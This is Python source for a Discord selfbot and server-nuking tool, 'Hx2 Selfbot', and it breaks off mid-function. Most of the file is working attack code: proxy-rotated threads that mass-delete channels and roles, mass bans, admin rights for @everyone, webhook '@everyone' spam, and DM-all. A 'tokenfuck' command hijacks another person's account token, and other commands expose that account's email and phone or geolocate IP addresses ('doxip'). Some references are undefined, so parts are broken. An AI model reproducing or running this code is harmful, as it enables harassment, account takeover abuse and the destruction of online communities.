import discord, time, string, random, requests, datetime, asyncio, json, os, clear, sys, threading, aiohttp, io, colored, logging
from time import sleep
import base64
from discord.ext import commands, tasks
from discord import Permissions
from colorama import Fore, Style
from random import randint
from colored import fg, attr
from itertools import cycle
from requests_futures.sessions import FuturesSession


class colors:

    main = fg('#00fefc')
    reset = attr('reset')


os.system(f'cls & title [hx2] - Configuration')

proxies = []
rotating = cycle(proxies)
sessions = requests.Session()
session = FuturesSession()
try:
    for line in open('Proxies.txt'):
        proxies.append(line.replace('\n', ""))
        #print(f"Trying Proxies Successfull")
except:
    print(f"Failed to Load Proxies From Proxies.txt")

out_file = "Proxies.txt"
f = open(out_file, 'wb')
r1 = requests.get("https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all")
r2 = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt")
f.write(r1.content)
f.write(r2.content)
f.close()

token = input(
    f'{colors.main}> {colors.reset}Token{colors.main}:{colors.reset} ')
prefix = input(
    f'{colors.main}> {colors.reset}Prefix{colors.main}:{colors.reset} ')
CHANNEL_NAMES = input(
    f'{colors.main}> {colors.reset}CHANNELNAMES {colors.main}:{colors.reset} ')
VCHANNELS_NAMES = input(
    f'{colors.main}> {colors.reset}VCHANNELNAMES {colors.main}:{colors.reset} '
)
CATEGORY_NAMES = input(
    f'{colors.main}> {colors.reset}CATEGORYNAMES {colors.main}:{colors.reset} '
)
ROLE_NAMES = input(
    f'{colors.main}> {colors.reset}ROLENAMES {colors.main}:{colors.reset} ')
Webhook_contents = input(
    f'{colors.main}> {colors.reset}Spam Masseges {colors.main}:{colors.reset} '
)


os.system('cls')
os.system('cls' if os.name == 'nt' else 'clear')
os.system('cls' if os.name == 'nt' else 'clear')


def check_token():
    if requests.get("https://discord.com/api/v8/users/@me",
                    headers={
                        "Authorization": f'{token}'
                    }).status_code == 200:
        return "user"
    else:
        return "bot"


if sys.platform == "linux":
    clear = lambda: sys("clear")
else:
    clear = lambda: sys("cls & mode 70,24")

token_type = check_token()
intents = discord.Intents.all()
intents.members = True
if token_type == 'user':
    headers = {'Authorization': f"{token}"}
    client = commands.Bot(command_prefix=prefix,
                          case_insensitive=False,
                          self_bot=True,
                          intents=intents)
else:
    if token_type == 'bot':
        headers = {'Authorization': f"Bot {token}"}
        client = commands.Bot(command_prefix=prefix,
                              case_insensitive=False,
                              intents=intents)
os.system('cls')


logging.basicConfig(
    level=logging.INFO,
    format=
    f"{colors.main}[{colors.reset}%(asctime)s{colors.main}] \033[0m%(message)s",
    datefmt="%H:%M:%S",
)


@client.event
async def on_ready():
    await client.change_presence(activity=discord.Streaming(
        name='Hx2 Selfbot',
        url='https://youtube.com/channel/UCKVtvqg4wt6e5jfqSKoTHQA'))

    print(f'''
    \x1b[38;5;196m██╗  ██╗██╗  ██╗    ██████╗
    \x1b[38;5;196m██║  ██║╚██╗██╔╝    ╚════██╗
    \x1b[38;5;196m███████║ ╚███╔╝       ███╔═╝
    \x1b[38;5;196m██╔══██║ ██╔██╗     ██╔══╝
    \x1b[38;5;196m██║  ██║██╔╝╚██╗    ███████╗
    \x1b[38;5;196m╚═╝  ╚═╝╚═╝  ╚═╝    ╚══════╝''')

    print(
        f"{colors.main}┏┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┓{colors.main}"
    )
    print(
        f"{colors.main} >{colors.main}Username :{colors.main} {client.user} {colors.main}"
    )
    print(
        f"{colors.main} >{colors.main}guilds :{colors.main} {len (client.guilds)} {colors.main}"
    )
    print(
        f"{colors.main} >{colors.main}Prefix :{colors.main} {client.command_prefix} {colors.main}"
    )
    print(
        f"{colors.main}┗┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┛{colors.main}"
    )


@client.command()
async def p(ctx):
    embed = discord.Embed(title='Hx2 Selfbot', color=0xf14645, description=f'**`{int(client.latency * 1000)}`**')
    await ctx.send(embed=embed)

@client.command()
async def channels(ctx):
    try:
        await ctx.message.delete()
        guild = ctx.guild.id
    except:
        logging.info(f"Connection error.")
        sleep(10)

    def mc(i):
        json = {"name": i}
        sessions = requests.Session()
        r = sessions.post(
            f"https://discord.com/api/v{random.randint(8, 9)}/guilds/{guild}/channels",
            headers=headers,
            json=json, proxies={
                            "http": 'http://' + next(rotating)
                        })

    for i in range(1000):
        threading.Thread(
             target=mc,
             args=(random.choice(channel_names), )
           ).start()
        print(f"\033[38;5;89m[\033[38;5;92m{ftime}\033[38;5;89m] \033[0mCreated thread with a count of {threading.active_count()} threads")
        print(f"\033[38;5;89m[\033[38;5;92m{ftime}\033[38;5;89m] \033[0mCreated channel {random.choice(CHANNEL_NAMES)}")

    await asyncio.sleep(15)
    clear()
    menu()

@client.command()
async def hep(ctx):
	await ctx.send(f"`​adminall              adminservers         alive                av                     ban                    banner                 bots                  bwizz                  carlban                clear                  copy                  cyclenick              decrypt              deletechannels       deletechannels2       disableCommunityMode dmall                  dynoban               encrypt                firstmessage gamestatus             help                   host                hypesquad            ipinfo               kick                   koyaban                listen                lock                 logo                 logout               massban               massban2              massban3               masscategory           masschannels           masschannels2          masskick               masskick2            masskick3            massmention           massreact             massroles             massroles2             massunban              members                nickall               p                     pings                play                   prefix                 pwizz                  renamechannels       renameroles            renameserver           restart                role                   scrape                 scrape1              sendall                serverinfo           spam                   stopcyclenick          stream                summrsban              swizz                  tokendisable          tokenfuck              tokeninfo            unlock               userinfo               voicechannels          vortexban              watch                 wickban             `")

@client.command()
async def clear(ctx, amount=100):
    await ctx.message.delete()
    await ctx.channel.purge(limit=amount)


@client.command()
async def alive(ctx):
    await ctx.message.delete()
    embed = discord.Embed(title='Your Are Using Hx2 Selfbot',
                          description='Hx2')
    await ctx.send(embed=embed)


@client.command()
async def watch(ctx, *, message):
    await ctx.message.delete()
    await client.change_presence(activity=discord.Activity(
        type=(discord.ActivityType.watching), name=message))


@client.command()
async def play(ctx, *, message):
    await ctx.message.delete()
    game = discord.Game(name=message)
    await client.change_presence(activity=game)


@client.command()
async def listen(ctx, *, message):
    await ctx.message.delete()
    await client.change_presence(activity=discord.Activity(
        type=(discord.ActivityType.listening), name=message))


@client.command()
async def stream(ctx, *, message):
    await ctx.message.delete()
    stream = discord.Streaming(name=message,
                               url='https://www.twitch.tv/Hx2 Selfbot')
    await client.change_presence(activity=stream)

@client.command()
async def gamestatus(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    game = discord.Game(
        name=message
    )
    await client.change_presence(activity=game)

@client.command()
async def dmall(ctx, *, message):
    for user in client.user.friends:
        try:
            await user.send(message)
            print(f"messaged: {user.name}")
        except:
            print(f"couldnt message: {user.name}")


@client.command()
async def scrape1(ctx):
    await ctx.message.delete()
    membercount = 0
    channelcount = 0
    rolecount = 0

    try:
        os.remove("Scraped/members.txt")
        os.remove("Scraped/channels.txt")
        os.remove("Scraped/roles.txt")
    except:
        pass

    with open('Scraped/members.txt', 'a') as f:
        ctx.guild.members
        for member in ctx.guild.members:
            f.write(str(member.id) + "\n")
            membercount += 1
        print(f"{Fore.GREEN}[-] {Fore.WHITE} Scraped {membercount} Member(s)")

    with open('Scraped/channels.txt', 'a') as f:
        ctx.guild.channels
        for channel in ctx.guild.channels:
            f.write(str(channel.id) + "\n")
            channelcount += 1
        print(f"{Fore.GREEN}[-] {Fore.WHITE} Scraped {channelcount} Channel(s)")

    with open('Scraped/roles.txt', 'a') as f:
        ctx.guild.roles
        for role in ctx.guild.roles:
            f.write(str(role.id) + "\n")
            rolecount += 1
        print(f"{Fore.GREEN}[-] {Fore.WHITE} Scraped {rolecount} Role(s)")

    print(f"{Fore.GREEN}[-] {Fore.WHITE}Finished! Restarting In 3 Seconds...")
    time.sleep(3)
    Clear()
    startprint()

@client.command(aliases=['rs'])
async def renameserver(ctx, *, name):
    await ctx.message.delete()
    await ctx.guild.edit(name=name)


@client.command(aliases=['rc'])
async def renamechannels(ctx, *, name):

    for channel in ctx.guild.channels:
        await channel.edit(name=name)


@client.command(aliases=['rr'])
async def renameroles(ctx, *, name):

    for role in ctx.guild.roles:
        await role.edit(name=name)


@client.command(aliases=['doxip'])
async def ipinfo(ctx, *, ipaddr: str = '54.47.2.7'):
    r = requests.get(f"http://extreme-ip-lookup.com/json/{ipaddr}")
    geo = r.json()
    em = discord.Embed()
    fields = [{
        'name': 'IP',
        'value': geo['query']
    }, {
        'name': 'Type',
        'value': geo['ipType']
    }, {
        'name': 'Country',
        'value': geo['country']
    }, {
        'name': 'City',
        'value': geo['city']
    }, {
        'name': 'Continent',
        'value': geo['continent']
    }, {
        'name': 'Country',
        'value': geo['country']
    }, {
        'name': 'Hostname',
        'value': geo['ipName']
    }, {
        'name': 'ISP',
        'value': geo['isp']
    }, {
        'name': 'Latitute',
        'value': geo['lat']
    }, {
        'name': 'Longitude',
        'value': geo['lon']
    }, {
        'name': 'Org',
        'value': geo['org']
    }, {
        'name': 'Region',
        'value': geo['region']
    }]
    for field in fields:
        if field['value']:
            em.add_field(name=(field['name']),
                         value=(field['value']),
                         inline=True)

    return await ctx.send(embed=em)


languages = {
    'hu': 'Hungarian, Hungary',
    'nl': 'Dutch, Netherlands',
    'no': 'Norwegian, Norway',
    'pl': 'Polish, Poland',
    'pt-BR': 'Portuguese, Brazilian, Brazil',
    'ro': 'Romanian, Romania',
    'fi': 'Finnish, Finland',
    'sv-SE': 'Swedish, Sweden',
    'vi': 'Vietnamese, Vietnam',
    'tr': 'Turkish, Turkey',
    'cs': 'Czech, Czechia, Czech Republic',
    'el': 'Greek, Greece',
    'bg': 'Bulgarian, Bulgaria',
    'ru': 'Russian, Russia',
    'uk': 'Ukranian, Ukraine',
    'th': 'Thai, Thailand',
    'zh-CN': 'Chinese, China',
    'ja': 'Japanese',
    'zh-TW': 'Chinese, Taiwan',
    'ko': 'Korean, Korea'
}
locales = [
    'da', 'de', 'en-GB', 'en-US', 'es-ES', 'fr', 'hr', 'it', 'lt', 'hu', 'nl',
    'no', 'pl', 'pt-BR', 'ro', 'fi', 'sv-SE', 'vi', 'tr', 'cs', 'el', 'bg',
    'ru', 'uk', 'th', 'zh-CN', 'ja', 'zh-TW', 'ko'
]


@client.command()
async def tokenfuck(ctx, _token):  # b'\xfc'
    await ctx.message.delete()
    headers = {
        'User-Agent':
        'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
        'Content-Type': 'application/json',
        'Authorization': _token,
    }
    request = requests.Session()
    payload = {
        'theme': "light",
        'locale': "ja",
        'message_display_compact': False,
        'inline_embed_media': False,
        'inline_attachment_media': False,
        'gif_auto_play': False,
        'render_embeds': False,
        'render_reactions': False,
        'animate_emoji': False,
        'convert_emoticons': False,
        'enable_tts_command': False,
        'explicit_content_filter': '0',
        'status': "invisible"
    }
    guild = {
        'channels': None,
        'icon': None,
        'name': "Itachi_Legend_ Legit OP",
        'region': "europe"
    }
    for _i in range(50):
        requests.post('https://discordapp.com/api/v6/guilds',
                      headers=headers,
                      json=guild)
    while True:
        try:
            request.patch(
                "https://canary.discordapp.com/api/v6/users/@me/settings",
                headers=headers,
                json=payload)
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
        else:
            break
    modes = cycle(["light", "dark"])
    statuses = cycle(["online", "idle", "dnd", "invisible"])
    while True:
        setting = {
            'theme': next(modes),
            'locale': random.choice(locals),
            'status': next(statuses)
        }
        while True:
            try:
                request.patch(
                    "https://canary.discordapp.com/api/v6/users/@me/settings",
                    headers=headers,
                    json=setting,
                    timeout=10)
            except Exception as e:
                print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
            else:
                break


@client.command()
async def scrape(ctx):
    await ctx.message.delete()
    mem = ctx.guild.members
    for member in mem:
        try:
            print("krliya scrape")
            mfil = open("Scraped/members.txt", "a")

            mfil.write(str(member.id) + "\n")
            mfil.close()

        except Exception as e:
            print("error", e)
    rol = ctx.guild.roles
    for roles in rol:
        try:
            print("dn")
            mfil = open("Scraped/roles.txt", "a")

            mfil.write(str(roles.id) + "\n")
            mfil.close()

        except Exception as e:
            print("nhi hue scrape biro", e)
    chan = ctx.guild.channels
    for channels in chan:
        try:
            print("channels are scraped")
            mfil = open("Scraped/channels.txt", "a")

            mfil.write(str(channels.id) + "\n")
            mfil.close()

        except Exception as e:
            print("channels nhi hue")


def ssspam(webhook):
    while spammingdawebhookeroos:
        data = {'content': '@everyone @here fucked by Hx 2'}
        spamming = requests.post(webhook, json=data)
        spammingerror = spamming.text
        if spamming.status_code == 204:
            continue
        if 'rate limited' in spammingerror.lower():
            try:
                j = json.loads(spammingerror)
                ratelimit = j['retry_after']
                timetowait = ratelimit / 1000
                time.sleep(timetowait)
            except:
                delay = random.randint(5, 10)
                time.sleep(delay)

        else:
            delay = random.randint(30, 60)
            time.sleep(delay)


@client.command()
async def pings(ctx):
    global spammingdawebhookeroos
    spammingdawebhookeroos = True
    if len(await ctx.guild.webhooks()) != 0:
        for webhook in await ctx.guild.webhooks():
            threading.Thread(target=ssspam, args=(webhook.url, )).start()

    if len(ctx.guild.text_channels) >= 50:
        webhookamount = 1
    else:
        webhookamount = 100 / len(ctx.guild.text_channels)
        webhookamount = int(webhookamount) + 2
    for i in range(webhookamount):
        for channel in ctx.guild.text_channels:
            try:
                webhook = await channel.create_webhook(name='Hx 2 ')
                threading.Thread(target=ssspam, args=(webhook.url, )).start()
                f = open('data/webhooks-' + str(ctx.guild.id) + '.txt', 'a')
                f.write(f"{webhook.url} \n")
                f.close()
            except:
                print(f"{Fore.RED} > Webhook Error")


@client.command()
async def ban(ctx, member: discord.Member, *, reason=None):
    await member.ban(reason=reason)
    await ctx.send('```Banned krdia chutie ko```')


@client.command()
async def role(ctx, user):
    await ctx.message.delete()
    await ctx.send(f"<@235148962103951360> role {user} 869444380879101952")
    await ctx.send(f"-invite reset {user}")
    await ctx.send(f"{user} **done** <#869433500347031593>")


@client.command()
async def kick(ctx, member: discord.Member, *, reason=None):
    await member.kick(reason=reason)
    await ctx.send('```Kick krdia chutie ko```')


@client.command()
async def tokeninfo(ctx, _token):
    headers = {'Authorization': _token, 'Content-Type': 'application/json'}
    try:
        res = requests.get('https://canary.discordapp.com/api/v9/users/@me',
                           headers=headers)
        res = res.json()
        user_id = res['id']
        locale = res['locale']
        avatar_id = res['avatar']
        language = languages.get(locale)
        creation_date = datetime.datetime.utcfromtimestamp(
            ((int(user_id) >> 22) + 1420070400000) /
            1000).strftime('%d-%m-%Y %H:%M:%S UTC')
    except KeyError:
        headers = {
            'Authorization': 'Bot ' + _token,
            'Content-Type': 'application/json'
        }
        try:
            res = requests.get(
                'https://canary.discordapp.com/api/v9/users/@me',
                headers=headers)
            res = res.json()
            user_id = res['id']
            locale = res['locale']
            avatar_id = res['avatar']
            language = languages.get(locale)
            creation_date = datetime.datetime.utcfromtimestamp(
                ((int(user_id) >> 22) + 1420070400000) /
                1000).strftime('%d-%m-%Y %H:%M:%S UTC')
            em = discord.Embed(
                description=
                f"Name: `{res['username']}#{res['discriminator']} ` **BOT**\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`"
            )
            fields = [{
                'name': 'Flags',
                'value': res['flags']
            }, {
                'name': 'Local language',
                'value': res['locale'] + (f"{language}")
            }, {
                'name': 'Verified',
                'value': res['verified']
            }]
            for field in fields:
                if field['value']:
                    em.add_field(name=(field['name']),
                                 value=(field['value']),
                                 inline=False)
                    em.set_thumbnail(
                        url=
                        f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}"
                    )

            return await ctx.send(embed=em)
        except KeyError:
            await ctx.send('Invalid token')

    em = discord.Embed(
        description=
        f"Name: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`"
    )
    nitro_type = 'None'
    if 'premium_type' in res:
        if res['premium_type'] == 2:
            nitro_type = 'Nitro Premium'
        elif res['premium_type'] == 1:
            nitro_type = 'Nitro Classic'
    fields = [{
        'name': 'Phone',
        'value': res['phone']
    }, {
        'name': 'Flags',
        'value': res['flags']
    }, {
        'name': 'Local language',
        'value': res['locale'] + (f"{language}")
    }, {
        'name': 'MFA',
        'value': res['mfa_enabled']
    }, {
        'name': 'Verified',
        'value': res['verified']
    }, {
        'name': 'Nitro',
        'value': nitro_type
    }]
    for field in fields:
        if field['value']:
            em.add_field(name=(field['name']),
                         value=(field['value']),
                         inline=False)
            em.set_thumbnail(
                url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}"
            )

    return await ctx.send(embed=em)


@client.command()
async def Hx2(ctx):
    await ctx.message.delete()
    embed = discord.Embed(title='YOUR R USING Hx2 SELFBOT', description='Hx2')
    await ctx.send(embed=embed)


@client.command()
async def host(ctx, _token):
    await ctx.message.delete()
    headers = {
        'User-Agent':
        'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
        'Content-Type': 'application/json',
        'Authorization': _token,
    }
    request = requests.Session()
    payload = {
        'theme': "light",
        'locale': "ja",
        'message_display_compact': False,
        'inline_embed_media': False,
        'inline_attachment_media': False,
        'gif_auto_play': False,
        'render_embeds': False,
        'render_reactions': False,
        'animate_emoji': False,
        'convert_emoticons': False,
        'enable_tts_command': False,
        'explicit_content_filter': '0',
        'status': "dnd"
    }
    statuses = cycle(["online", "idle", "dnd", "invisible"])
    await asyncio.sleep(5)
    while True:
        setting = {'status': next(statuses)}
        while True:
            try:
                request.patch(
                    "https://canary.discordapp.com/api/v9/users/@me/settings",
                    headers=headers,
                    json=setting,
                    timeout=10)
            except Exception as e:
                print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
            else:
                break


@client.command()
async def logo(ctx):
    em = discord.Embed(title=(ctx.guild.name))
    em.set_image(url=(ctx.guild.icon_url))
    await ctx.send(embed=em)


@client.command()
async def userinfo(ctx, member: discord.Member = None):
    if not member:
        member = ctx.message.author
    roles = [role for role in member.roles]
    embed = discord.Embed(colour=(discord.Colour.default()),
                          timestamp=(ctx.message.created_at),
                          title=f"User Info - {member}")
    embed.set_thumbnail(url=(member.avatar_url))
    embed.add_field(name='ID:', value=(member.id), inline=False)
    embed.add_field(name='Display Name:',
                    value=(member.display_name),
                    inline=False)
    embed.add_field(
        name='Created Account On:',
        value=(member.created_at.strftime('%a, %#d %B %Y, %I:%M %p UTC')))
    embed.add_field(
        name='Joined Server On:',
        value=(member.joined_at.strftime('%a, %#d %B %Y, %I:%M %p UTC')),
        inline=False)
    embed.add_field(name='Roles:',
                    value=(''.join([role.mention for role in roles])),
                    inline=False)
    embed.add_field(name='Highest Role:',
                    value=(member.top_role.mention),
                    inline=False)
    print(member.top_role.mention)
    await ctx.send(embed=embed)


languages = {
    'hu': 'Hungarian, Hungary',
    'nl': 'Dutch, Netherlands',
    'no': 'Norwegian, Norway',
    'pl': 'Polish, Poland',
    'pt-BR': 'Portuguese, Brazilian, Brazil',
    'ro': 'Romanian, Romania',
    'fi': 'Finnish, Finland',
    'sv-SE': 'Swedish, Sweden',
    'vi': 'Vietnamese, Vietnam',
    'tr': 'Turkish, Turkey',
    'cs': 'Czech, Czechia, Czech Republic',
    'el': 'Greek, Greece',
    'bg': 'Bulgarian, Bulgaria',
    'ru': 'Russian, Russia',
    'uk': 'Ukranian, Ukraine',
    'th': 'Thai, Thailand',
    'zh-CN': 'Chinese, China',
    'ja': 'Japanese',
    'zh-TW': 'Chinese, Taiwan',
    'ko': 'Korean, Korea'
}
locales = [
    'da', 'de', 'en-GB', 'en-US', 'es-ES', 'fr', 'hr', 'it', 'lt', 'hu', 'nl',
    'no', 'pl', 'pt-BR', 'ro', 'fi', 'sv-SE', 'vi', 'tr', 'cs', 'el', 'bg',
    'ru', 'uk', 'th', 'zh-CN', 'ja', 'zh-TW', 'ko'
]


@client.command()
async def massreact(ctx, emote):
    await ctx.message.delete()
    messages = await ctx.message.channel.history(limit=100).flatten()
    for message in messages:
        await message.add_reaction(emote)


@client.command()
async def banner(ctx):
    em = discord.Embed(title=(ctx.guild.name))
    em.set_image(url=(ctx.guild.banner_url))
    await ctx.send(embed=em)


@client.command()
async def adminall(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    try:
        role = discord.utils.get((guild.roles), name='@everyone')
        await role.edit(permissions=(Permissions.all()))
        print(Fore.MAGENTA + 'I have given everyone admin.' + Fore.RESET)
    except:
        print(Fore.GREEN + 'I was unable to give everyone admin' + Fore.RESET)


@client.command()
async def lock(ctx):
    await ctx.channel.set_permissions((ctx.guild.default_role),
                                      send_messages=False)
    await ctx.send(ctx.channel.mention + 'SUCCESSFULLY LOCKED')


@client.command()
async def prefix(ctx, prefix):
    client.command_prefix = str(prefix)
    await ctx.message.delete()
    await ctx.send('```YOUR PREFIX HAS BEEN CHANGED```')


@client.command()
async def members(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    embed = discord.Embed(timestamp=datetime.datetime.utcnow())
    embed.set_author(name="Hx2 Selfbot", icon_url=ctx.guild.icon_url)
    embed.add_field(name="Member Count:", value=f"> {len(guild.members)}")
    await ctx.channel.send(embed=embed)


@client.command()
async def unlock(ctx):
    await ctx.channel.set_permissions((ctx.guild.default_role),
                                      send_messages=True)
    await ctx.send(ctx.channel.mention + 'SUCCESSFULLY UNLOCKED')


@client.command(description='Mutes the specified user.')
@commands.has_permissions(manage_messages=True)
async def mute(ctx, member: discord.Member, *, reason=None):
    guild = ctx.guild
    mutedRole = discord.utils.get((guild.roles), name='Hx2 selfbot')
    if not mutedRole:
        mutedRole = await guild.create_role(name='Hx2 selfbot')
        for channel in guild.channels:
            await channel.set_permissions(mutedRole,
                                          speak=False,
                                          send_messages=False,
                                          read_message_history=True,
                                          read_messages=False)

    embed = discord.Embed(title='mute mute',
                          description=f"{member.mention} WAS MUTED ",
                          colour=(discord.Colour.light_gray()))
    embed.add_field(name='REASON:', value=reason, inline=False)
    await ctx.send(embed=embed)
    await member.add_roles(mutedRole, reason=reason)
    await member.send(
        f" YOU HAVE BEEN MUTED FROM: {guild.name} BECAUSE: {reason}")


@client.command(description='Unmutes a specified user.')
@commands.has_permissions(manage_messages=True)
async def unmute(ctx, member: discord.Member):
    mutedRole = discord.utils.get((ctx.guild.roles), name='dn with unmute')
    await member.remove_roles(mutedRole)
    await member.send(f" YOU HAVE BEEN UNMUTED: - {ctx.guild.name}")
    embed = discord.Embed(title='Krdis unmute mze kro',
                          description=f" UNMUTE-{member.mention}",
                          colour=(discord.Colour.light_gray()))
    await ctx.send(embed=embed)


@client.command(pass_context=True)
async def serverinfo(ctx):
    embed = discord.Embed(name=("{}'s info".format(ctx.message.server.name)),
                          description='Here is your server info',
                          color=65280)
    embed.set_author(name='Server Info')
    embed.add_field(name='Name', value=(ctx.message.server.name), inline=True)
    embed.add_field(name='ID', value=(ctx.message.server.id), inline=True)
    embed.add_field(name='Roles',
                    value=(len(ctx.message.server.roles)),
                    inline=True)
    embed.add_field(name='Members', value=(len(ctx.message.server.members)))
    embed.set_thumbnail(url=(ctx.message.server.icon_url))
    await client.say(embed=embed)


@client.command()
async def bots(ctx):
    await ctx.message.delete()
    bots = []
    for member in ctx.guild.members:
        if member.bot:
            bots.append(
                str(member.name).replace("`", "\`").replace("*", "\*").replace(
                    "_", "\_") + "#" + member.discriminator)
    bottiez = f"**Bots ({len(bots)}):**\n{', '.join(bots)}"
    await ctx.send(bottiez)


@client.command()
async def adminservers(ctx):
    await ctx.message.delete()
    admins = []
    bots = []
    kicks = []
    bans = []
    for guild in client.guilds:
        if guild.me.guild_permissions.administrator:
            admins.append(discord.utils.escape_markdown(guild.name))
        if guild.me.guild_permissions.manage_guild and not guild.me.guild_permissions.administrator:
            bots.append(discord.utils.escape_markdown(guild.name))
        if guild.me.guild_permissions.ban_members and not guild.me.guild_permissions.administrator:
            bans.append(discord.utils.escape_markdown(guild.name))
        if guild.me.guild_permissions.kick_members and not guild.me.guild_permissions.administrator:
            kicks.append(discord.utils.escape_markdown(guild.name))
    adminPermServers = f"**Servers with Admin ({len(admins)}):**\n{admins}"
    botPermServers = f"\n**Servers with BOT_ADD Permission ({len(bots)}):**\n{bots}"
    banPermServers = f"\n**Servers with Ban Permission ({len(bans)}):**\n{bans}"
    kickPermServers = f"\n**Servers with Kick Permission ({len(kicks)}:**\n{kicks}"
    await ctx.send(adminPermServers + botPermServers + banPermServers +
                   kickPermServers)


@client.command(aliases=['changehypesquad'])
async def hypesquad(ctx, house):
    await ctx.message.delete()
    request = requests.Session()
    headers = {
        'Authorization':
        token,
        'Content-Type':
        'application/json',
        'User-Agent':
        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
    }
    if house == "bravery":
        payload = {'house_id': 1}
    elif house == "brilliance":
        payload = {'house_id': 2}
    elif house == "balance":
        payload = {'house_id': 3}
    elif house == "random":
        houses = [1, 2, 3]
        payload = {'house_id': random.choice(houses)}
    try:
        request.post('https://discordapp.com/api/v8/hypesquad/online',
                     headers=headers,
                     json=payload,
                     timeout=10)
    except Exception as e:
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)


@client.command()
async def sendall(ctx, *, message):
    await ctx.message.delete()
    try:
        channels = ctx.guild.text_channels
        for channel in channels:
            await channel.send(message)
    except:
        pass


@client.command(aliases=['dc'])
async def deletechannels(ctx):
    await ctx.message.delete()
    print(f"{Fore.RED}Deleting Channels . . .")
    for channel in ctx.guild.channels:
        await channel.delete()
    print(f"{Fore.RED} Channels Deleted")


@client.command(aliases=['pfp', 'avatar'])
async def av(ctx, *, user: discord.Member = None):
    await ctx.message.delete()
    format = "gif"
    user = user or ctx.author
    if user.is_avatar_animated() != True:
        format = "png"
    avatar = user.avatar_url_as(format=format if format != "gif" else None)
    async with aiohttp.ClientSession() as session:
        async with session.get(str(avatar)) as resp:
            image = await resp.read()
    with io.BytesIO(image) as file:
        await ctx.send(file=discord.File(file, f"Avatar.{format}"))


@client.command(pass_context=True)
async def cyclenick(ctx, *, text):
    await ctx.message.delete()
    global cycling
    cycling = True
    while cycling:
        name = ""
        for letter in text:
            name = name + letter
            await ctx.message.author.edit(nick=name)


@client.command()
async def stopcyclenick(ctx):
    await ctx.message.delete()
    global cycling
    cycling = False


@client.command()
async def nickall(ctx, nickname):
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.edit(nick=nickname)
        except:
            pass


async def massunban(ctx):
    await ctx.message.delete()
    banlist = await ctx.guild.bans()
    for users in banlist:
        try:
            await asyncio.sleep(2)
            await ctx.guild.unban(user=users.user)
        except:
            print("failed to unban")


@client.command(aliases=['mcat'])
async def masscategory(ctx, amount=250):
    await ctx.message.delete()
    for i in range(amount):
        try:
            await ctx.guild.create_category(random.choice(CATEGORY_NAMES))
            print(f"[{i}] CATEGORY made")
        except:
            print("error making CATEGORY")


@client.command(aliases=['mvc'])
async def voicechannels(ctx, amount=250):
    await ctx.message.delete()
    channels = ctx.guild.channels
    for channels in channels:
        try:
            print(channels.name + " Has been wizzed")
        except:
            pass
            print("error")
            guild = ctx.message.guild
    for i in range(amount):
        try:
            await ctx.guild.create_voice_channel(random.choice(VCHANNELS_NAMES)
                                                 )
            print(f"[{i}] vchannels made")
        except:
            print("error making vchannels")


@client.command(aliases=['mr'])
async def massroles(ctx, amount=250):
    await ctx.message.delete()
    roles = ctx.guild.roles
    for roles in roles:
        try:
            await roles.delete()
            print(roles.name + " Has been wizzed")
        except:
            pass
            print("error")
            guild = ctx.message.guild
    for i in range(amount):
        try:
            await ctx.guild.create_role(random.choice(ROLE_NAMES))
            print(f"[{i}] roles made")
        except:
            print("error making roles")


@client.command(aliases=['mc'])
async def masschannels(ctx, amount=250):
    await ctx.message.delete()
    channels = ctx.guild.channels
    for channel in channels:
        try:
            await channel.delete()
            print(channel.name + " Has been wizzed")
        except:
            pass
            print("error")
            guild = ctx.message.guild
    for i in range(amount):
        try:
            await ctx.guild.create_text_channel(random.choice(CHANNEL_NAMES))
            print(f"[{i}] channels made")
        except:
            print("error making channels")


@client.command()
async def masschannels2(ctx):
    try:
        await ctx.message.delete()
        guild = ctx.guild.id
    except:
        logging.info(f"Connection error.")
        sleep(10)

    def mc(i):
        json = {"name": i}
        r = sessions.post(
            f"https://discord.com/api/v9/guilds/{guild}/channels",
            headers=headers,
            json=json)

    for i in range(500):
        threading.Thread(target=mc,
                         args=(random.choice(CHANNEL_NAMES), )).start()
        logging.info(f"Created channel {random.choice(CHANNEL_NAMES)}.")

    await asyncio.sleep(15)


@client.command(aliases=['dc2'])
async def deletechannels2(ctx):
    try:
        await ctx.message.delete()
        guild = ctx.guild.id
    except:
        logging.info(f"Connection error.")
        sleep(10)

    def dc(i):
        sessions.delete(f"https://discord.com/api/v9/channels/{i}",
                        headers=headers,
                        proxies={
                            "http": 'http://' + next(rotating)
                        }).result()

    for i in range(4):
        for channel in list(ctx.guild.channels):
            threading.Thread(target=dc, args=(channel.id, )).start()
            logging.info(f"Deleted channel {channel}.")


@client.command(aliases=['ban2'])
async def massban2(ctx):
    try:
        await ctx.message.delete()
        guild = ctx.guild.id
    except:
        logging.info(f"Connection error.")
        sleep(10)

    def mass_ban(i):
        r = sessions.put(f"https://discord.com/api/v9/guilds/{guild}/bans/{i}",
                         headers=headers,
                         proxies={
                             "http": 'http://' + next(rotating)
